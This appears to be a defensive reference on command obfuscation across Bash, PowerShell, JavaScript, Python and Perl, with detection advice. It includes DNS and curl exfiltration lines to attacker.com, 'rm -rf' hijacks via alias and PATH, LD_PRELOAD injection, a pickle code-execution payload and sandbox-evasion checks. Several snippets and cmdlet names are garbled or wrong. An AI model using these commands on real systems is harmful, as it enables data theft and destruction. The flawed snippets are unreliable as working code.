# Command Obfuscation Techniques: Technical Documentation

## Overview

Command obfuscation is a technique used to disguise the intent or source of executable commands, making them difficult to read, analyze, and understand. This document provides technical analysis of common obfuscation methods used in shells (Bash, PowerShell, etc.), programming languages, and system administration.

**Note:** This documentation is intended for defensive security, incident response, and legitimate system administration purposes.

---

## 1. Shell Command Obfuscation

### 1.1 Variable Indirection

**Technique:** Storing commands or parts of commands in variables to hide their actual purpose.

**Examples:**

```bash
# Basic variable obfuscation
cmd="echo"
arg="Hello World"
$cmd $arg

# Multi-level indirection
var1="echo"
var2=$var1
$var2 "Obfuscated"

# Variable substitution with special characters
c="e""c""h""o"
$c "Hidden command"

# Using arrays
cmd_array=("ec" "ho")
${cmd_array[0]}${cmd_array[1]} "Text"
```

**Detection:** Look for indirect command execution using `$variable` or `${variable}` patterns.

---

### 1.2 Command Substitution Nesting

**Technique:** Using nested command substitution `$()` or backticks to obscure command chains.

**Examples:**

```bash
# Single level
$(echo echo) "Hidden"

# Multi-level nesting
$($(echo echo) echo) "Very Hidden"

# Mixed substitution methods
`echo echo` "Using backticks"

# Complex nesting
$(eval "$(echo echo) Text")

# Backtick nesting
`eval \`echo echo\` Text`
```

**Detection:** Monitor for excessive command substitution depth and `eval` usage.

---

### 1.3 Character Encoding & Concatenation

**Technique:** Breaking commands into pieces or using encoding to hide intent.

**Examples:**

```bash
# Hexadecimal encoding
echo -e "\x65\x63\x68\x6f\x20\x48\x69"  # "echo Hi"

# Octal encoding
echo -e "\145\143\150\157"  # "echo"

# Base64 encoding
echo "ZWNobyAiSGVsbG8gV29ybGQi" | base64 -d  # Decodes to: echo "Hello World"

# String concatenation
a="e"; b="c"; c="h"; d="o"; $a$b$c$d "Test"

# Mixed encoding
$'\x65\x63\x68\x6f' "Using ANSI-C quoting"

# printf encoding
$(printf '\145\143\150\157') "Octal printf"
```

**Detection:** Look for encoding patterns, base64 data, escape sequences, and string concatenation operations.

---

### 1.4 Wildcard & Globbing Patterns

**Technique:** Using file globbing and wildcards to match command names.

**Examples:**

```bash
# Directory matching
/b??/sh -c "id"  # Matches /bin/sh

# Glob pattern for commands
/b?n/b?sh  # Matches /bin/bash

# Character class matching
/[b]in/[b]ash

# Combining with parameters
?v?l $(echo "id")  # Matches: eval

# Mixed wildcards
/*/bin/?ash /c "whoami"
```

**Detection:** Monitor for unusual path patterns with `?` and `*` characters.

---

### 1.5 IFS (Internal Field Separator) Manipulation

**Technique:** Changing IFS to split commands in unexpected ways.

**Examples:**

```bash
# Standard IFS bypass
IFS=/ eval 'echo/hello'

# Command split across IFS
IFS=:
cmd="id:root"
$cmd

# Complex IFS manipulation
old_IFS=$IFS
IFS=$'\'
cmd='echo'IFS='hello'
eval $cmd
IFS=$old_IFS

# Using newline as separator
IFS=$'\n'
cmd=$(echo -e "echo\ntest")
$cmd
```

**Detection:** Monitor for IFS modifications and unusual shell variable assignments.

---

### 1.6 Alias & Function Redefinition

**Technique:** Creating aliases or functions that shadow real commands.

**Examples:**

```bash
# Simple alias obfuscation
alias ls='rm -rf'
ls /path/to/files

# Function shadowing
echo() { rm -rf "$@"; }
echo "test"

# Hidden function with special names
_() { eval "$@"; }
_ "id"

# Recursive function
eval() { $(echo eval) "$@"; }

# Environment function variable
export PROMPT_COMMAND='malicious_function'
```

**Detection:** Inspect alias and function definitions; monitor PROMPT_COMMAND and similar shell hooks.

---

### 1.7 Unicode & Special Characters

**Technique:** Using Unicode, special characters, or escape sequences to disguise commands.

**Examples:**

```bash
# Unicode characters
ec​ho "hidden"  # Zero-width space between "ec" and "ho"

# RTL override (U+202E)
echo‮ olleh

# Using non-printing characters
echo -e "e\x00c\x00h\x00o"

# Special quoting
"e"'c'"h"'o' "text"

# Escaped characters
e\c\h\o "test"

# Mixed quotes
$'echo \144ata'  # \144 is octal for 'd'
```

**Detection:** Use hexdump or od to analyze suspicious strings; check for unusual Unicode characters.

---

### 1.8 Path Manipulation

**Technique:** Exploiting PATH variable to execute different commands.

**Examples:**

```bash
# Prepend custom directory to PATH
export PATH=/tmp:$PATH
# Create malicious 'ls' in /tmp
echo '#!/bin/bash' > /tmp/ls
echo 'rm -rf /' >> /tmp/ls
chmod +x /tmp/ls
ls  # Executes malicious version

# Using current directory
export PATH=.:$PATH
# Create command in current directory
./rm  # Could be different from /bin/rm

# Unset PATH for implicit binary
unset PATH
exec /malicious/binary
```

**Detection:** Monitor PATH modifications; track which binaries are actually executed.

---

### 1.9 Here-Documents & Here-Strings

**Technique:** Using heredoc syntax to pass obfuscated code.

**Examples:**

```bash
# Basic heredoc
bash << 'EOF'
eval "encoded_command_here"
EOF

# Indented heredoc
bash <<- 'EOF'
	$(malicious_code)
EOF

# Multiple here-documents
eval "$(cat <<'EOF'
base64_encoded_payload
EOF
)" | base64 -d

# Here-string with process substitution
bash < <(echo "id")
```

**Detection:** Monitor heredoc usage, especially with `-` option; analyze content passed to interpreters.

---

### 1.10 Process Substitution

**Technique:** Using `<()` and `>()` to disguise command execution.

**Examples:**

```bash
# Reading from process
cat <(echo "malicious code")

# Writing to process
echo "command" > >(bash)

# Nested process substitution
bash <(cat <(echo "id"))

# Complex redirection
while read line; do eval "$line"; done < <(echo "id")
```

**Detection:** Monitor process substitution patterns; track all eval operations.

---

## 2. PowerShell Obfuscation

### 2.1 Encoding & Compression

**Technique:** Using PowerShell encoding and compression features.

**Examples:**

```powershell
# Base64 encoding
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Get-Process"))

# Execution via -EncodedCommand
powershell -EncodedCommand JABjAD0AKABHAGUAdAAtAEMAaABpAGwkAGEEAEkAdABlAG0AKQAgACAAICAK

# Compression with GZIP
$CompressedCmd = [System.Convert]::ToBase64String(
  [System.IO.Compression.GZipStream]::new(
    [System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes("Get-Process")),
    [System.IO.Compression.CompressionMode]::Compress
  ).ToArray()
)

# XOR encoding
[String]::Concat(
  @(
    ([Byte[]][Char[]"Get-Process") | ForEach-Object {
      $_ -bxor 0xFF
    }
  )
)
```

**Detection:** Analyze `-EncodedCommand` parameters; decode base64 strings; monitor GZipStream usage.

---

### 2.2 Type Acceleration & .NET Reflection

**Technique:** Using .NET reflection to invoke commands without direct cmdlet names.

**Examples:**

```powershell
# Using reflection to call GetMethod
[System.Diagnostics.Process]::Start("cmd.exe", "/c tasklist")

# Reflection to find and invoke methods
$class = [System.Diagnostics.ProcessStartInfo]
$instance = New-Object $class
$instance.FileName = "powershell.exe"
$instance.Arguments = "-NoP -W Hidden -C Get-Process"
[System.Diagnostics.Process]::Start($instance)

# Using Type.GetType
$type = [Type]::GetType("System.Diagnostics.Process")
$method = $type.GetMethod("Start", [Type[]]@([String], [String]))
$method.Invoke($null, @("cmd.exe", "/c ipconfig"))

# Direct assembly call
[Reflection.Assembly]::LoadWithPartialName("System.Management").CreateInstance(
  "System.Management.ManagementClass"
).GetMethod("GetInstances").Invoke($null, $null)
```

**Detection:** Monitor reflection API usage; track assembly loading; analyze .NET method invocations.

---

### 2.3 String Manipulation & Concatenation

**Technique:** Building commands through concatenation and variable substitution.

**Examples:**

```powershell
# Character array concatenation
[Char[]]@(71, 101, 116, 45, 80, 114, 111, 99, 101, 115, 115) | % { [String]$_ } | % { $_ }

# Variable substitution in strings
$cmd = "G" + "e" + "t" + "-" + "P" + "r" + "o" + "c" + "e" + "s" + "s"
Invoke-Expression $cmd

# String reverse
[String]::Concat([Char[]"ssecorP-teG"[$(71..1)])

# Substring extraction
"Get-Process".Substring(0, 3) + "-" + "Get-Process".Substring(4, 7)

# Char array from ASCII
[String]([Char[]](71, 101, 116, 45, 80, 114, 111, 99, 101, 115, 115))
```

**Detection:** Monitor Invoke-Expression usage; analyze string manipulation patterns; check variable concatenation.

---

### 2.4 Script Block & ScriptBlockAst Manipulation

**Technique:** Using AST (Abstract Syntax Tree) to dynamically construct script blocks.

**Examples:**

```powershell
# Dynamic script block creation
$ScriptBlock = [ScriptBlock]::Create("Get-Process")
& $ScriptBlock

# Obfuscated script block
$code = [ScriptBlock]::Create(
  [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String("R2V0LVByb2Nlc3M=")
  )
)
& $code

# AST manipulation
$AST = [System.Management.Automation.Language.Parser]::ParseInput(
  "Get-Process",
  [ref]$null,
  [ref]$null
)
$code = $AST.Find({ $args[0] -is [System.Management.Automation.Language.CommandAst] }, $false)
```

**Detection:** Monitor ScriptBlock creation and invocation; analyze AST operations; track Invoke-Expression.

---

### 2.5 Namespace & Module Hiding

**Technique:** Importing functions from hidden namespaces or modules.

**Examples:**

```powershell
# Using Windows.ps1xml
$ExecutionContext.InvokeCommand.GetCommand("Get-ChildItem", "Cmdlet")

# ForEach-Object as alias
Get-Process | % { $_.Name }  # % is alias for ForEach-Object

# Object property access instead of cmdlets
Get-WmiObject Win32_Process | Select-Object Name

# Using dynamic cmdlet names
$verb = "Get"
$noun = "Process"
& "$verb-$noun"

# Importing from assembly
Add-Type -AssemblyName System.Management
[System.Management.ManagementClass]$mgmt = New-Object System.Management.ManagementClass("Win32_Process")
```

**Detection:** Monitor CmdletBinding attributes; track Get-Command usage; analyze dynamic cmdlet construction.

---

## 3. Multi-Language Obfuscation

### 3.1 JavaScript Obfuscation

**Technique:** Encoding and minifying JavaScript to hide intent.

**Examples:**

```javascript
// Hexadecimal encoding
eval(
  String.fromCharCode(
    118, 97, 114, 32, 99, 109, 100, 32, 61, 32, 34, 105, 100, 34, 59
  )
);

// Base64 with atob
eval(
  atob("dmFyIGNtZCA9ICJpZCI7IGV2YWwoY21kKTs=")
);

// Function constructor
new Function("return eval(atob('Y29uc29sZS5sb2coImhpIik='))")();

// Prototype pollution
Object.prototype.constructor = Function;
Object.prototype.constructor("console.log('hidden')")();

// Array manipulation
(function() {
  var a = []; 
  a[0] = 1; a[1] = 0;
  // ... computed command
}).call();

// IIFE with closure
(function(window) {
  eval(String.fromCharCode(105, 100));
})(this);
```

**Detection:** Analyze eval() calls; decode base64 strings; monitor atob() usage; check for suspicious IIFE patterns.

---

### 3.2 Python Obfuscation

**Technique:** Using Python's dynamic evaluation and encoding features.

**Examples:**

```python
# exec with encoded string
exec(bytes.fromhex("7072696e7428226869646465")decode("utf-8"))

# compile with source code objects
compile(bytes.fromhex("636f64656f626a..."), "<string>", "exec")

# __import__ for dynamic imports
__import__("os").system("id")

# globals() and locals() access
globals()["__import__"]("os").system("id")

# Lambda and map
cmd = list(map(chr, [105, 100]))  # 'id'
__import__("os").system("".join(cmd))

# getattr with encoded strings
module = __import__("os")
func = getattr(module, "sy" + "stem")
func("id")

# AST manipulation
import ast
code = compile(ast.parse("id"), "<string>", "eval")
eval(code)

# Pickle deserialization
import pickle
pickle.loads(b"c__import__\nos\nsystem\nq\nX\x02\x00\x00\x00idq\ntRq\n.")
```

**Detection:** Monitor exec() and eval() calls; analyze compile() usage; track __import__ and getattr operations.

---

### 3.3 Perl Obfuscation

**Technique:** Using Perl's dereferencing and string manipulation.

**Examples:**

```perl
# String eval with pack
eval(pack("H*", "7379737465")); # system()

# Variable interpolation
$cmd = "system";
$cmd->('id');

# Dereference and call
my $func = \&system;
$func->("id");

# Symbolic reference
$fn = "system";
no strict 'refs';
&$fn("id");

# Here-doc with eval
eval <<'EOF';
system("id");
EOF

# Prototyped function call
sub system { die "blocked\n" };
my $ref = \&main::system;
$ref->("id");

# tr// operator for encoding
$cmd = "arpfln";
$cmd =~ tr/a-z/b-za/;  # Caesar cipher
```

**Detection:** Monitor eval() usage; track symbolic references; analyze pack/unpack operations; check variable dereferencing.

---

## 4. Advanced Obfuscation Techniques

### 4.1 Polyglot Commands

**Technique:** Creating code that executes differently in multiple contexts.

**Examples:**

```bash
# Bash/Perl polyglot
eval 'exec /usr/bin/perl -x "$0" "$@"'
#!perl
#!/usr/bin/perl
system("id");
__END__
#!/bin/bash
# Rest is bash
```

```powershell
# PowerShell/Batch polyglot
@echo off
rem powershell -c "[ScriptBlock]::Create('whoami').Invoke()"
REM More batch here
```

**Detection:** Analyze file headers; check for multiple shebang lines; monitor language detection.

---

### 4.2 Memory Injection & Runtime Patching

**Technique:** Modifying code at runtime using memory techniques.

**Examples:**

```python
# ctypes memory patching
import ctypes
address = id("malicious_func")
ctypes.cast(address, ctypes.POINTER(ctypes.c_char)).value = b"injected"

# Monkey patching
import os
original = os.system
os.system = lambda x: original(f"blocked_prefix; {x}")
```

```javascript
// Function prototype modification
Function.prototype.constructor = new Proxy(Function, {
  construct() {
    return eval;
  }
});
```

**Detection:** Monitor ctypes/memory manipulation; track sys.modules modifications; analyze Proxy usage.

---

### 4.3 Environment Variable Exploitation

**Technique:** Using environment variables to modify behavior.

**Examples:**

```bash
# LD_PRELOAD for library injection
export LD_PRELOAD=/tmp/malicious.so
./legitimate_binary

# PYTHONPATH manipulation
export PYTHONPATH=/tmp:$PYTHONPATH
python -c "import malicious"

# Shell option environment
export BASH_PROFILE="malicious_code"
bash -l

# Java CLASSPATH
export CLASSPATH=/tmp:$CLASSPATH
java MyClass
```

**Detection:** Monitor LD_PRELOAD and LD_LIBRARY_PATH; track PYTHONPATH; audit environment modifications.

---

### 4.4 DNS & Network-Based Obfuscation

**Technique:** Hiding commands in DNS queries or network communication.

**Examples:**

```bash
# DNS exfiltration
nslookup "$(whoami).attacker.com"

# Reverse DNS lookup for command execution
# Attacker controls DNS server to respond with commands

# HTTP parameter hiding
curl "http://attacker.com/?cmd=$(id | base64)"

# ICMP tunnel
# Command execution via ICMP packets
```

**Detection:** Monitor DNS queries for data exfiltration patterns; analyze unusual network connections; inspect URL parameters.

---

## 5. Detection & Mitigation Strategies

### 5.1 Log Analysis

**Key Log Sources:**
- Syslog (/var/log/syslog, /var/log/auth.log)
- Bash history (~/.bash_history)
- PowerShell logs (Event Viewer: Windows PowerShell)
- Command audit logs (auditd)
- Web server logs for web-based obfuscation

**Red Flags:**
- Excessive use of `eval`, `exec`, `System.Reflection`
- Base64/hex-encoded strings
- Unusual variable substitution patterns
- PATH manipulation
- Heredoc with binary content
- Multiple levels of command substitution

---

### 5.2 Real-Time Monitoring

**Tools & Techniques:**

```bash
# Monitor process execution
auditctl -w /usr/bin -p x -k exec_audit

# Monitor eval operations
auditctl -a exit,always -F arch=b64 -S trace_read_write -k exec_trace

# Syscall monitoring with strace
strace -f -e execve bash -c "suspicious_command"

# File integrity monitoring
aide --config=/etc/aide/aide.conf --check

# Network monitoring
tcpdump -i any -w capture.pcap "tcp port 443"
```

---

### 5.3 Deobfuscation Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| `strings` | Extract readable strings | `strings suspicious_file` |
| `hexdump` | View hexadecimal content | `hexdump -C file` |
| `strace` | Trace system calls | `strace -f program` |
| `ltrace` | Trace library calls | `ltrace program` |
| `ndisasm` | Disassemble binary | `ndisasm -b 64 code.bin` |
| `radare2` | Reverse engineering framework | `r2 binary` |
| `ghidra` | NSA's reverse engineering tool | GUI-based analysis |
| `CyberChef` | Online encoding/decoding | Web-based tool |
| `de4dot` | .NET deobfuscator | `de4dot obfuscated.dll` |

---

### 5.4 Defensive Strategies

**For Bash:**
```bash
# Disable eval
alias eval="echo 'eval is disabled'"

# Restrict command substitution
shopt -s restricted_shell

# Enable strict mode
set -euo pipefail

# Use shellcheck for static analysis
shellcheck script.sh
```

**For PowerShell:**
```powershell
# Constrained language mode
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"

# Disable dangerous cmdlets
Disable-PSRemoting

# Script block logging
Set-PSScriptBlockLoggingState -Enable $true

# Module logging
Enable-PSModuleLogging
```

**For Python:**
```python
# Disable eval/exec at entry
import ast
def safe_eval(code):
    try:
        node = ast.parse(code, mode='eval')
        # Validate AST nodes
        return eval(compile(node, '<string>', 'eval'))
    except Exception:
        raise ValueError("Unsafe code")
```

---

## 6. Defense Evasion Techniques (Adversarial Context)

### 6.1 Anti-Analysis Methods

These techniques are used by adversaries to evade detection:

**Examples:**

```bash
# Environment detection
if [ -f /.dockerenv ] || [ -f /.dockerinit ]; then
  echo "Running in container - exit"
  exit 0
fi

# Sandbox detection
if [[ -d "/proc/vboxguest" || -d "/sys/devices/virtual" ]]; then
  echo "Virtual environment detected"
  exit 0
fi

# Debugger detection
if [ -e "/proc/$$/maps" ]; then
  # Check for gdb, strace, etc.
  grep -q "gdb\|strace" /proc/$$/maps && exit 0
fi

# Process tracing detection
strace -e trace=none true 2>/dev/null
if [ $? -eq 0 ]; then
  echo "strace is available"
fi
```

**Detection:** Monitor environment checks; track sandbox detection patterns; analyze process introspection.

---

## 7. Legal & Ethical Considerations

### Legitimate Uses
- Security research and vulnerability analysis
- Incident response and forensics
- Malware analysis in controlled environments
- Defensive tool development
- System administration and automation

### Illegal/Unethical Uses
- Unauthorized command execution on systems
- Malware distribution and obfuscation
- Data theft and exfiltration
- Privilege escalation exploits
- Covering tracks after unauthorized access

**Always obtain proper authorization before analyzing or testing systems.**

---

## 8. References & Further Reading

### Documentation
- OWASP: Code Injection
- MITRE ATT&CK: Command and Scripting Interpreter
- NIST: Software Supply Chain Security
- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code
- CWE-94: Improper Control of Generation of Code

### Tools
- Ghidra (Reverse Engineering)
- Radare2 (Binary Analysis)
- De4dot (.NET Deobfuscation)
- Yara (Pattern Matching)
- Sigma Rules (Log Detection)

### Research Papers
- "Code Obfuscation and Stealth" Academic Studies
- SANS Institute: Obfuscation Techniques
- BlackHat Conference Presentations
- DEF CON Talk Archives

---

## Conclusion

Command obfuscation is a critical security topic spanning defensive analysis, threat detection, and secure coding practices. Understanding these techniques is essential for:

- **Security professionals** conducting incident response and forensics
- **System administrators** protecting infrastructure
- **Developers** writing secure, maintainable code
- **Security researchers** analyzing threats

The defensive stance should always prioritize:
1. Monitoring and logging
2. Least privilege principles
3. Input validation
4. Code review and static analysis
5. Sandboxing and isolation
6. Continuous security awareness

